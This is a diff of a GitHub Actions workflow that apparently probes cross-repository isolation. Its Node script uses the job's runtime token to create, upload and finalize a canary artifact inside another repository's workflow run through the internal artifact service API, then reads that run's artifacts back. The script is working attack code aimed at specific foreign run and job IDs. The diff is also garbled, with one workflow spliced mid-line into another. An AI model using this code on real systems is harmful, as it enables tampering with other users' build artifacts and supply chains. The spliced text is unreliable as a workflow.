@@ -90,6 +90,74 @@ jobs:
         run: |
           set +e
           node <<'NODE'
+          (async () => {
+          const fs = require('fs');
+          const crypto = require('crypto');
+          const { execFileSync } = require('child_process');
+          const token = process.env.ACTIONS_RUNTIME_TOKEN || '';
+          const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
+          const targetRun = process.env.TARGET_RUN_BACKEND;
+          const targetJob = process.env.TARGET_JOB_BACKEND;
+          const name = process.env.ARTIFACT_NAME;
+          const auth = { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json', Accept: 'application/json' };
+          async function rpc(method, body) {
+            const r = await fetch(`${base}/twirp/github.actions.results.api.v1.ArtifactService/${method}`, { method: 'POST', headers: auth, body: JSON.stringify(body) });
+            const t = await r.text();
+            let j; try { j = JSON.parse(t); } catch { j = t.slice(0, 1000); }
+            console.log(`${method}_STATUS=${r.status}`); console.log(`${method}_BODY=${JSON.stringify(j)}`); return { status: r.status, body: j };
+          }
+          fs.writeFileSync('/tmp/foreign-artifact.txt', 'B_FOREIGN_ARTIFACT_CANARY_20260804\\n');
+          execFileSync('zip', ['-q', '/tmp/foreign-artifact.zip', '/tmp/foreign-artifact.txt']);
+          const data = fs.readFileSync('/tmp/foreign-artifact.zip');
+          const create = await rpc('CreateArtifact', { workflow_run_backend_id: targetRun, workflow_job_run_backend_id: targetJob, name, version: 7, mime_type: { value: 'application/zip' } });
+          if (create.body && create.body.signed_upload_url) {
+            const up = await fetch(create.body.signed_upload_url, { method: 'PUT', headers: { 'Content-Type': 'application/zip', 'x-ms-blob-type': 'BlockBlob' }, body: data });
+            console.log(`UPLOAD_STATUS=${up.status}`); console.log(`UPLOAD_BODY=${JSON.stringify((await up.text()).slice(0,500))}`);
+            const hash = crypto.createHash('sha256').update(data).digest('hex');
+            await rpc('FinalizeArtifact', { workflow_run_backend_id: targetRun, workflow_job_run_backend_id: targetJob, name, size: String(data.length), hash: { value: `sha256:${hash}` } });
+            await rpc('ListArtifacts', { workflow_run_backend_id: targetRun, workflow_job_run_backend_id: targetJob });
+          }
+          console.log(`TARGET_REPO=${process.env.TARGET_REPO}`); console.log(`TARGET_RUN=${process.env.TARGET_RUN}`); console.log(`TARGET_JOB=${process.env.TARGET_JOB}`);
+          })();
+          NODE
+      - name: Verify A artifact source of truth
+        uses: actions/github-script@v7
+        env:
+          TARGET_OWNER: apexblackrhino1782764375
+          TARGET_REPO_NAME: ab-actions-isolation-1783396429
+          TARGET_RUN: "30870519778"
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          script: |
+            async function req(method, route) {
+              try { const r = await github.request(method + ' ' + route); return { status: r.status, data: r.data }; }
+              catch (e) { return { status: e.status || 0, data: e.response?.data || String(e.message) }; }
+            }
+            const out = await req('GET', `/repos/${process.env.TARGET_OWNER}/${process.env.TARGET_REPO_NAME}/actions/runs/${process.env.TARGET_RUN}/artifacts`);
+            console.log('A_ARTIFACT_READBACK=' + JSON.stringify(out));name: G06 Artifact Foreign Finalizer Probe
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    env:
+      TARGET_RUN_BACKEND: fc9005c2-789b-42c4-8950-5b4a46bbc186
+      TARGET_JOB_BACKEND: d141db06-407a-5f42-bece-96d69087cd6c
+      TARGET_REPO: apexblackrhino1782764375/ab-actions-isolation-1783396429
+      TARGET_RUN: "30870519778"
+      TARGET_JOB: "91871400993"
+      ARTIFACT_NAME: B_FOREIGN_ARTIFACT_CANARY_20260804
+    steps:
+      - name: Create, upload, finalize foreign artifact
+        env:
+          RUNTIME_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set +e
+          node <<'NODE'
           const fs = require('fs');
           const crypto = require('crypto');
           const { execFileSync } = require('child_process');
